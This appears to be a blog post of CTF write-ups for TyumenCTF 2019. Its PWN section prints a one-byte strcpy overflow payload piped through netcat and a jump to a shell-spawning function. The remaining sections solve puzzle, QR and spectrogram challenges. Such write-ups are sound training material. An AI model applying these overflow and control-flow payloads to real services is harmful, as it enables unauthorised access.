---
layout: post
category: writeups
title:  "TyumenCTF 2019"
subtitle: "Millennium"
date: 2019-04-02
head_message: "These are our writeups for the challenges presented in this year's <a href=\"https://tyumenctf.ru/\">TyumenCTF</a>."
head_ctf_categories:
  - pwn
  - joy
  - misc
  - stegano
---

# PWN

## Chat I

> Hello, this is your first task for today. Admin hides some information. Try to find out.<br><br>
> Connection data:<br>
> How: nc XXX.XXXXXXXXX.XX NNNN<br>
> Token: `6MsmrUmPi`<br><br>
> Attachments: `a.out`, `easy.c`

The relevant portion of the source code to get the first flag of this series was:

```c
struct user{
    char token[10];
    char nick[10];
    int isAdmin;
};

void print_user(struct user *user){
    printf("User info:\n");
    printf("   Nick: \t%s\n", user->nick);
    printf("   His token:\t%s\n", user->token);
    printf("   isAdmin: \t%d\n", user->isAdmin);
    if (user->isAdmin == 1){
        print_flag0(user->token);  // <-- Here's what we want to reach!
    }
}

struct user* create_user(char *nick, char* token){
    struct user *user = malloc(sizeof(user));
    user->isAdmin = 0;
    strcpy(user->token, token);
    strcpy(user->nick, nick);
    return user;
}

void main_menu(struct user *user){
    int c = 1;
    int choice = 0;
    while (c){
        printf("\n");
        printf("Select command:\n");
        printf("    1) Join chat\n");
        printf("    2) See user information\n");
        printf("    3) Quit\n\n");

        printf(">> ");
        scanf("%d", &choice);
        while(getchar() != '\n');
        printf("\n\n");

        switch (choice){
            case 1: start_chat(user); break;
            case 2: print_user(user); break;
            // ...
        }
        choice = 0;
    }
}

void welcome(char *some_info){
    char token[10];
    char nick[12] = "";
    printf("Hello, guest!\n");
    printf("Enter your token: ");
    scanf("%9s", token);

    // ...

    printf("Enter your nick: ");
    scanf("%11s", nick);

    struct user *user = create_user(nick, token);

    // ...
    main_menu(user);
}

int main(int argc, char* argv[]){
    // ...
    welcome(argv[1]);
    // ...
}
```

Since the unsecure `strcpy` was used to move the nick's buffer around, it was vulnerable to overflows - _the token had to be kept intact to identify different triggers of the **Chat** series_:

```text
$ (python2 -c 'print "6MsmrUmPi"+"A"*10+"\x01"'; cat) | nc XXX.XXXXXXXXX.XX NNNN

Hello, guest!
Enter your token: Enter your nick:
Welcome to our chat!

Select command:
    1) Join chat
    2) See user information
    3) Quit
```

```text
>> 2

User info:
   Nick: 	AAAAAAAAAA
   His token:	6MsmrUmPi
   isAdmin: 	1
TyumenCTF{0ne_byt3_overf1ow_D33ORd}
```
{: .spoiler}

## Return my

> Return my... To return here: XXX.XXXXXXXXX.XX NNNN<br><br>
> Attachments: `pwn`

A binary was attached:

```text
pwn: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=348934655967dca186bcc8dc8ab74731eb7c4e3e, not stripped
```

Statically linked executables are not the most comfortable to work with, but taking a shot at disassembling them with Ghidra usually never hurts... _Apart from your eyes in case you have an HiDPI display. Text becomes **so damn small** in Java applications._

A quick glance at the `main` function made it obvious, even without retyping and renaming the code, that the program accepted an input, converted it to a memory address and executed the function sitting at that location.

```c
undefined8 main(void) {
  code *local_18;
  code *local_10;

  setvbuf((FILE *)stdout, (char *)0x0, 2, 0);
  printf("Return my: ");
  __isoc99_scanf(&DAT_00489a10, &local_18);
  local_10 = local_18;
  (*local_18)();
  return 1;
}
```

How to find the exact address to jump to, though? An accurate analysis in the huge amount of recognizable functions was performed, and finally one named `TheNextEpisode` popped up: it spawned a shell!

```c
void TheNextEpisode(void) {
  execve("/bin/sh", (char **)0x0, (char **)0x0);
  return;
}
```

Its address was 0x400ad2<sub>hex</sub>, and it took us an embarassingly long time to figure out that it needed to be converted to 4197074<sub>dec</sub> to be correctly accepted.

```text
$ nc pwn.tyumenctf.ru 1493
Return my: 4197074
cat flag4
TyumenCTF{dr_dre_of_course}
```
{: .spoiler}

---

# Joy

## Desktop background

> As you can see, you can set any external image as a wallpaper in our beautiful system.<br>
> ✅ Make photo, search or create an image that in line with the spirit of millennial (2000's).<br>
> ✅ Set the image as wallpaper in our system.<br>
> ✅ Post it somewhere (on Twitter, Facebook or VK) with tags #tmnctf #tmnctf_2000 #tmnctf_mln and send post's link to team@tyumenctf.ru.<br>
> If everything would be correct we will send back the flag.

Pretty much self-explanatory, even though only 151 teams chose to complete it. [This image](https://pbs.twimg.com/media/D29zpjhWwAA9wt3.jpg) was one of our choices.

`TyumenCTF{1_l1ke_my_photo_0n_background}`{: .spoiler}

## DOOM

> Wanna flag? Just DOOM it! Play and you won't miss it.<br><br>
> Attachments: `DOOM.7z`

The attached archive contained the WAD file for Doom II (`DOOM.WAD`) and a patchset (`CTFDOOM.WAD`). We tried unpacking the files and playing the game, but the flag finally became clearly evident as the files were opened in Slade, a Doom texture editor: the flag was written on a wall's texture.

## Baby language

> Long time ago in a galaxy far-far away Sarochka was young. And she was talking in the same way...<br><br>
> Connect: nc XXX.XXXXXXXXX.XX NNNN

Upon netcat'ing to the server an usual `Hello world!` was issued and then standard replies were spit out with every line sent - the output didn't look it it was depending on any particular input condition, so plowing through with empty newlines did the trick:

```text
Mama
ooo
(V)O_O(V)
O_o
:)
meeeee
html - язык программирования
EAT
0xDEADBEEF
Sarochka
ug
hochu
play!
Dance!
oi eeee
42
agu
Cthulhu fhtagn!
Papa
[...]
TyumenCTF{d1d_i_tell_u_what_th3_def1n1tion_of_INS@NITY_1s}
```

_**Insanity**: doing the same thing over and over again and expecting a different result._ This time it worked ¯\\\_(ツ)\_/¯

`TyumenCTF{d1d_i_tell_u_what_th3_def1n1tion_of_INS@NITY_1s}`{: .spoiler}

---

# Misc

## Chronology

> Chronology<br><br>
> Attachments: `chronology.zip`

The archive contained some QR codes named after Windows releases.

![Chronology QRs](/assets/img/TyumenCTF_2019/chronology.png)

Renaming them to be in [the correct order](https://en.wikipedia.org/wiki/Timeline_of_Microsoft_Windows) allowed them to be decoded as a Base64 string and thus revealed the flag.

```text
$ (for n in {1..16}; do zbarimg "$n.png" 2>/dev/null | cut -d ':' -f2 | tr '\n' ' ' | tr -d ' '; done) | base64 -d
TyumenCTF{n0w_u_know_all_ab0ut_version_c0ntrol}
```
{: .spoiler}

---

# Stegano

## Synesthesia

> Kind of strange ringtone<br><br>
> Attachments: `ringtone.wav`

The attached audio file mostly sounded like a standard polyphonic ringone, with the exception of the first few seconds which contained a noticeable amount of background noise.

Hiding information in audio files is typically done via LSB/parity/phase coding or spectrum manipulation. In this case the latter was applied, and a quick run through `sox` identified the flag:

```bash
$ sox ringtone.wav -n spectrogram
```

![Ringtone's spectrum](/assets/img/TyumenCTF_2019/synesthesia.png)

`TyumenCTF{w0w_u_h3ard_th3_flag1}`{: .spoiler}
